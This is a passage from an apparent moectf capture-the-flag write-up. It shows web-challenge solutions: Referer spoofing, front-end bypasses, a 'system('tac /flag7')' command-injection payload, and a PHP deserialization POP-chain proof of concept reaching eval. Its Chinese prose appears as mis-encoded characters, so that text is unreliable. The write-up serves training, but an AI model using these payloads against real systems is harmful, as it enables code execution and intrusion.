/flag3.php</code></p><p>ÂïäÔºüÈöæÈÅì‰Ω†‰∏çÊòØ‰ªé <a href="http://localhost:8080/flag3cad.php?a=1">http://localhost:8080/flag3cad.php?a=1</a> ÁÇπÂáªÈìæÊé•ËøáÊù•ÁöÑÂêóÔºü<br>Âùè‰∫ÜÔºåËÇØÂÆöÊòØÂì™ÈáåÊêûÈîô‰∫ÜÔºåË¶Å‰∏ç‰Ω†ÁúãÁúãËÉΩ‰∏çËÉΩËá™Â∑±‰∏¥Êó∂ÂáëÂêàÂáëÂêàÔºü</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://localhost:8080/flag3cad.php?a=1</span></span></code></pre><p><img src="7ball_3.png" loading="lazy"></p><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;head&gt;    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;    &lt;title&gt;flag4&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;ok, ‰Ω†ÊàêÂäüÈóØÂÖ•‰∫ÜÁ¨¨ÂõõÂÖ≥ÔºÅ&lt;br&gt;Êú¨ÂÖ≥ËÄÉÈ™å‰Ω†Âê¨Â£∞Ëæ©‰ΩçÁöÑÂäüÂ§´Ôºå‰Ω†ÈúÄË¶ÅÊåâ‰∏ãÂºÄÂßãÊåâÈíÆÂêéÔºåÊ†πÊçÆÊèêÁ§∫Êåâ‰∏ãÁõ∏Â∫îÁöÑÊåâÈíÆ„ÄÇ&lt;br&gt;&lt;button onclick&#x3D;&quot;start()&quot;&gt;ÂºÄÂßã&lt;&#x2F;button&gt;&lt;span id&#x3D;&quot;num&quot;&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;div id&#x3D;&quot;scope&quot;&gt;    &lt;button onclick&#x3D;&quot;getID(this)&quot;&gt;1&lt;&#x2F;button&gt;    &lt;button onclick&#x3D;&quot;getID(this)&quot;&gt;2&lt;&#x2F;button&gt;    &lt;button onclick&#x3D;&quot;getID(this)&quot;&gt;3&lt;&#x2F;button&gt;    &lt;button onclick&#x3D;&quot;getID(this)&quot;&gt;4&lt;&#x2F;button&gt;    &lt;button onclick&#x3D;&quot;getID(this)&quot;&gt;5&lt;&#x2F;button&gt;    &lt;button onclick&#x3D;&quot;getID(this)&quot;&gt;6&lt;&#x2F;button&gt;    &lt;button onclick&#x3D;&quot;getID(this)&quot;&gt;7&lt;&#x2F;button&gt;    &lt;button onclick&#x3D;&quot;getID(this)&quot;&gt;8&lt;&#x2F;button&gt;&lt;&#x2F;div&gt;&lt;script&gt;    var buttons &#x3D; document.getElementById(&quot;scope&quot;).getElementsByTagName(&quot;button&quot;);    for (var i &#x3D; 0; i &lt; buttons.length; i++) &#123;        buttons[i].id &#x3D; i + 1;    &#125;    function start() &#123;        document.getElementById(&quot;num&quot;).innerText &#x3D; &quot;9&quot;;    &#125;    function getID(button) &#123;        if (button.id &#x3D;&#x3D; 9) &#123;            alert(&quot;‰Ω†ËøáÂÖ≥ÔºÅÔºàÈìú‰∫∫ÈúáÂ£∞Ôºâ\nÊàë‰ª¨‰ΩøÁî® console.log Êù•‰∏∫‰Ω†ÁîüÊàê flag&quot;);            fetch(&#39;flag4bbc.php&#39;, &#123;                method: &#39;post&#39;,                body: &#39;method&#x3D;get&#39;,                headers: &#123;                    &#39;Content-Type&#39;: &#39;application&#x2F;x-www-form-urlencoded&#39;,                &#125;,            &#125;).then((data) &#x3D;&gt; &#123;                return data.json();            &#125;).then((result) &#x3D;&gt; &#123;console.log(result.hint);                console.log(result.fll);                console.log(result.goto)            &#125;);        &#125; else &#123;            alert(&quot;ËØ•ÁΩöÔºÅ(Â§¥ÈÉ®Á¢∞ÊíûÂ£∞)&quot;)        &#125;    &#125;&lt;&#x2F;script&gt;</code></pre><p>Ê∑ªÂä†‰∏Ä‰∏™buttonÂç≥ÂèØ</p><pre class="language-markup" data-language="markup"><code class="language-markup">ÊÅ≠Âñú‰Ω†ÔºÅ‰Ω†Â∑≤ÁªèÁü•ÈÅìÔºåÂâçÁ´ØÁöÑ‰∏ÄÂàáÈÉΩÊòØÂèØ‰ª•Êõ¥ÊîπÁöÑÔºÅ flag4: fdFVUMHJÂâçÂæÄÔºö/flag5sxr.php</code></pre><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>    <span class="token keyword">function</span> <span class="token function">checkValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> content <span class="token operator">=</span> document<span class="token punctuation">.</span>forms<span class="token punctuation">[</span><span class="token string">"form"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"content"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>content <span class="token operator">==</span> <span class="token string">"I want flag"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"‰Ω†Â∞±Ëøô‰πàÁõ¥Êé•Ôºü"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>burpÊäìÂåÖÂèëÈÄÅ</p><pre class="language-markup" data-language="markup"><code class="language-markup">ÊÅ≠ÂñúÔºåÊàëÁõ∏‰ø°‰Ω†Â∑≤ÁªèÊ∑±Âàª‰∫ÜËß£‰∫ÜÂâçÁ´Ø‰∏çÂèØ‰ø°‰ªªÁöÑÈÅìÁêÜ!flag5: fSV90aDF</code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag6diw.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'moe'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'moe'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'moe'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'moe'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"flag6: xxx"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>ÊèêÁ§∫Â∑≤ÁªèÂæàÊòéÊòæ‰∫ÜÔºåÂ§ßÂ∞èÂÜôÁªïËøá</p><pre class="language-markup" data-language="markup"><code class="language-markup">flag6: rZV9VX2t</code></pre><p><img src="7ball_4.png" loading="lazy"></p><pre class="language-markup" data-language="markup"><code class="language-markup">POST: what=system('tac /flag7');flag7:rbm93X1dlQn0=</code></pre><pre class="language-markup" data-language="markup"><code class="language-markup">flag: bW9lY3Rme0FmdEVyX3RoMXNfdFVUMHJfSV90aDFrZV9VX2trbm93X1dlQn0= base64-->      moectf&#123;AftEr_th1s_tUT0r_I_th1ke_U_kknow_WeB&#125;</code></pre><h4 id="pop-moe"><a href="#pop-moe" class="headerlink" title="pop moe"></a>pop moe</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">class000</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$payl0ad</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$what</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">payl0ad</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'FAILED TO ATTACK'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">what</span><span class="token punctuation">;</span>        <span class="token variable">$a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">class001</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$payl0ad</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">-></span><span class="token property">payload</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">payl0ad</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">class002</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$sec</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$b</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sec</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">dangerous</span><span class="token punctuation">(</span><span class="token variable">$whaattt</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$whaattt</span><span class="token operator">-></span><span class="token function">evvval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sec</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">class003</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$mystr</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">evvval</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mystr</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>ÂèØ‰ª•Âà©Áî®ÁöÑÂáΩÊï∞ÊòØ<code>class003</code>Á±ªÁöÑ<code>evvval</code>ÂáΩÊï∞ÈáåÁöÑ<code>eval</code>ÔºåÁÑ∂ÂêéÂèçÊé®ÁúãÁúãÊÄé‰πàËß¶Âèë„ÄÇ</p><p>1.<code>class002</code>Á±ªÁöÑ<code>dangerous</code>ÂáΩÊï∞ÔºåÂ¶ÇÊûú<code>$whaattt</code>‰∏∫<code>class003</code>Á±ªÔºåÂ∞±ÂèØ‰ª•Ëß¶Âèë<code>evvval</code></p><p>2.ÂêåÁ±ª‰∏ãÁöÑ<code>__set</code>ÂèØ‰ª•Ëß¶Âèë<code>dangerous</code>Ôºå<code>$b</code>‰∏∫<code>dangerous</code>Ôºå<code>$sec</code>Â∞±ÊòØË¶Å‰º†ÈÄíÁöÑÂèÇÊï∞ÔºåÂ∞±ÊòØ<code>class003</code></p><p>3.ÂêåÊó∂Êàë‰ª¨ÂèëÁé∞‰∏Ä‰∏™ÈóÆÈ¢òÔºåÂ¶ÇÊûúÊ≠§Êó∂<code>$sec</code>‰∏∫<code>class003</code>ÔºåÈÇ£‰πà‰Ωú‰∏∫<code>evvval</code>ÂáΩÊï∞ÁöÑÂèÇÊï∞ÔºåË¶ÅÊ±Ç‰º†ÂÖ•ÁöÑÂèòÈáèÊòØÂ≠óÁ¨¶‰∏≤Ôºå‰ΩÜÊòØÊàë‰ª¨‰º†ÂÖ•ÁöÑÊòØ‰∏Ä‰∏™Á±ªÔºåËøõËÄåÂ∞±‰ºöËß¶Âèë<code>__tostring</code>ÂáΩÊï∞ÔºåËøîÂõû~Á±ªÁöÑ<code>$mystr</code>ÔºåÊâÄ‰ª•Âè™Ë¶ÅÁªô<code>$mystr</code>ËµãÂÄºÔºåÂ∞±Ëß£ÂÜ≥‰∫Ü<code>eval</code>ÂáΩÊï∞ÁöÑÂèÇÊï∞ÈóÆÈ¢ò</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//---- ÊääÁ±ªÂΩì‰ΩúÂ≠óÁ¨¶‰∏≤‰ΩøÁî®Êó∂Ëß¶Âèë</span></code></pre><p>4.Êé•ÁùÄÂèçÂêëÂàÜÊûêÔºåÂ¶Ç‰ΩïËß¶Âèë<code>__set</code></p><pre class="language-php" data-language="php"><code class="language-php"> <span class="token function">__set</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//--------- Áî®‰∫éÂ∞ÜÊï∞ÊçÆÂÜôÂÖ•‰∏çÂèØËÆøÈóÆÁöÑÂ±ûÊÄß</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">test</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">private</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Jay"</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$input</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token variable">$test</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$test</span><span class="token operator">-></span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"David"</span><span class="token punctuation">;</span>  <span class="token comment"># Âõ†‰∏∫name‰∏∫ÁßÅÊúâÂèòÈáèÔºåÊâÄ‰ª•‰∏ÄËà¨Êù•ËØ¥Êó†Ê≥ïÁõ¥Êé•ËµãÂÄºÁöÑÔºåÊâÄ‰ª•Ê≠§Êó∂‰ºöËß¶Âèë__setÈ≠îÊúØÊñπÊ≥ï</span><span class="token keyword">echo</span> <span class="token variable">$test</span><span class="token operator">-></span><span class="token variable">$name</span><span class="token punctuation">;</span>  <span class="token comment"># ËæìÂá∫"David"</span></code></pre><p>Âú®class001Á±ª‰∏≠<code>__invoke</code>ÂáΩÊï∞ÔºåÂ¶ÇÊûú<code>$a</code>‰∏∫<code>class002</code>ÔºåÈÇ£‰πàÂú®<code>class002</code>‰∏≠Âπ∂Ê≤°Êúâ<code>payload</code>ËøôÊ†∑ÁöÑÂ±ûÊÄßÔºå‰∫éÊòØ‰ºöËß¶Âèë<code>class002</code>‰∏≠ÁöÑ<code>__set</code>ÔºåÊ≠§Êó∂<code>$this-&gt;payl0ad</code>Âç≥‰∏∫‰∏äËø∞‰æãÂ≠ê‰∏≠ÁöÑ<code>$input</code>Ôºå‰πüÊòØÈ¢òÁõÆ‰∏≠<code>__set</code>‰∏≠ÁöÑ<code>$b</code>ÔºåÊâÄ‰ª•Âè™ÈúÄË¶ÅËÆ©<code>$payl0ad</code>‰∏∫<code>dangerous</code>Âç≥ÂèØ</p><p>5.Â¶Ç‰ΩïËß¶Âèë<code>__invoke</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//------ ÂΩìÂ∞ùËØïÂ∞ÜÂØπË±°Ë∞ÉÁî®‰∏∫ÂáΩÊï∞Êó∂Ëß¶Âèë</span></code></pre><p>ÂæàÂÆπÊòìÂèëÁé∞Âè™ÈúÄË¶ÅÂ∞Ü<code>class000</code>Á±ª‰∏≠ÁöÑ<code>$what</code>ËµãÂÄº‰∏∫<code>class001</code>Âç≥ÂèØËß¶Âèë<code>__invoke()</code></p><p>Ëá≥Ê≠§ÔºåÂÆåÊï¥ÁöÑpopÈìæ‰∏∫</p><pre class="language-php" data-language="php"><code class="language-php">class000<span class="token operator">.</span><span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token property">class000</span><span class="token operator">.</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token property">class001</span><span class="token operator">.</span><span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token property">class002</span><span class="token operator">.</span><span class="token function">__set</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token property">class002</span><span class="token operator">.</span><span class="token function">dangerous</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token property">class003</span><span class="token operator">.</span><span class="token function">evvval</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token property">class003</span><span class="token operator">.</span><span class="token function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>POC:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">class000</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$payl0ad</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$what</span><span class="token punctuation">;</span> <span class="token comment">// protected</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">class001</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$payl0ad</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'dangerous'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">class002</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$sec</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">class003</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$mystr</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">class000</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">what</span> <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">class001</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">what</span><span class="token operator">-></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">class002</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">what</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">-></span><span class="token property">sec</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">class003</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">what</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">-></span><span class="token property">sec</span><span class="token operator">-></span><span class="token property">mystr</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"phpinfo();"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-markup" data-language="markup"><code class="language-markup">moectf&#123;1T_sEEmS_tH@t-YOU_Know-WH4t-is-pOP-lN_pHPpPpPPp!!!39&#125; </code></pre><h4 id="ÂãáÈóØÈìú‰∫∫Èòµ"><a href="#ÂãáÈóØÈìú‰∫∫Èòµ" class="headerlink" title="ÂãáÈóØÈìú‰∫∫Èòµ"></a>ÂãáÈóØÈìú‰∫∫Èòµ</h4><p><img src="spider.png" loading="lazy"></p><p>ÊúâÊó∂Èó¥ÈôêÂà∂ÔºåÊâÄ‰ª•Âü∫Êú¨ÊÄùË∑ØÂ∞±ÊòØÂÜôËÑöÊú¨ÈÄöÂÖ≥</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup<span class="token keyword">import</span> re<span class="token keyword">def</span> <span class="token function">getKeyword</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">:</span>    beautiful_soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">,</span> <span class="token string">"html.parser"</span><span class="token punctuation">)</span>    key_text <span class="token operator">=</span> beautiful_soup<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"h1"</span><span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token operator">=</span><span class="token string">"status"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>key_text<span class="token punctuation">.</span>text<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> key_textdirect_dic <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'1'</span><span class="token punctuation">:</span> <span class="token string">"ÂåóÊñπ‰∏Ä‰∏™"</span><span class="token punctuation">,</span>    <span class="token string">'2'</span><span class="token punctuation">:</span> <span class="token string">"‰∏úÂåóÊñπ‰∏Ä‰∏™"</span><span class="token punctuation">,</span>    <span class="token string">'3'</span><span class="token punctuation">:</span> <span class="token string">"‰∏úÊñπ‰∏Ä‰∏™"</span><span class="token punctuation">,</span>    <span class="token string">'4'</span><span class="token punctuation">:</span> <span class="token string">"‰∏úÂçóÊñπ‰∏Ä‰∏™"</span><span class="token punctuation">,</span>    <span class="token string">'5'</span><span class="token punctuation">:</span> <span class="token string">"ÂçóÊñπ‰∏Ä‰∏™"</span><span class="token punctuation">,</span>    <span class="token string">'6'</span><span class="token punctuation">:</span> <span class="token string">"Ë•øÂçóÊñπ‰∏Ä‰∏™"</span><span class="token punctuation">,</span>    <span class="token string">'7'</span><span class="token punctuation">:</span> <span class="token string">"Ë•øÊñπ‰∏Ä‰∏™"</span><span class="token punctuation">,</span>    <span class="token string">'8'</span><span class="token punctuation">:</span> <span class="token string">"Ë•øÂåóÊñπ‰∏Ä‰∏™"</span><span class="token punctuation">&#125;</span>url <span class="token operator">=</span> <span class="token string">"http://localhost:7650/"</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>url<span class="token punctuation">&#125;</span></span><span class="token string">restart"</span></span><span class="token punctuation">)</span>getKeyword<span class="token punctuation">(</span>response<span class="token punctuation">)</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>post_data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"player"</span><span class="token punctuation">:</span> <span class="token string">"hsad"</span><span class="token punctuation">,</span>    <span class="token string">"direct"</span><span class="token punctuation">:</span> <span class="token string">"ÂºüÂ≠êÊòéÁôΩ"</span><span class="token punctuation">&#125;</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">&#125;</span><span class="token keyword">print</span><span class="token punctuation">(</span>post_data<span class="token punctuation">)</span>response <span class="token operator">=</span> session<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> data<span class="token operator">=</span>post_data<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 7, 1</span>    res <span class="token operator">=</span> getKeyword<span class="token punctuation">(</span>response<span class="token punctuation">)</span>    <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'(\d+)'</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    <span class="token comment"># print(match)</span>    number <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token keyword">for</span> num <span class="token keyword">in</span> <span class="token keyword">match</span><span class="token punctuation">]</span>    <span class="token comment"># print(number)</span>    <span class="token keyword">if</span> <span class="token string">', '</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        post_data<span class="token punctuation">[</span><span class="token string">'direct'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>direct_dic<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>number<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">Ôºå</span><span class="token interpolation"><span class="token 